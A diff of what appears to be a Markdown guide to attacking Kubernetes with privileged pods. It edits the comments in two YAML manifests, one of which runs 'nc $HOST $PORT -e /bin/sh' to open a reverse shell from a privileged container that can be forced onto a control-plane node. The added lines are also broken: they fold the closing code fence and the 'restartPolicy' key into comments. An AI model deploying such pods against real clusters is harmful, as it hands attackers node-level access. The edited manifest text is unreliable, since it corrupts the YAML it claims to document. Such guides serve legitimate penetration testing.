@@ -22,8 +22,7 @@ spec:
     args: [ "while true; do sleep 30; done;" ]
     securityContext:
       privileged: true
-  #nodeName: control-plane-node-name # Uncomment and change to control node name to try and schedule pod on control-plane node
-  ```
+  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  ```
 [pod-priv.yaml](pod-priv.yaml)
 
 #### Option 1: Create pod from local yaml 
@@ -58,8 +57,7 @@ spec:
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
     securityContext:
       privileged: true
-    #nodeName: control-plane-node-name # Uncomment and change to control node name to try and schedule pod on control-plane node
-  restartPolicy: Always
+    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  restartPolicy: Always
 ```
 [pod-priv-revshell.yaml](pod-priv-revshell.yaml)
 
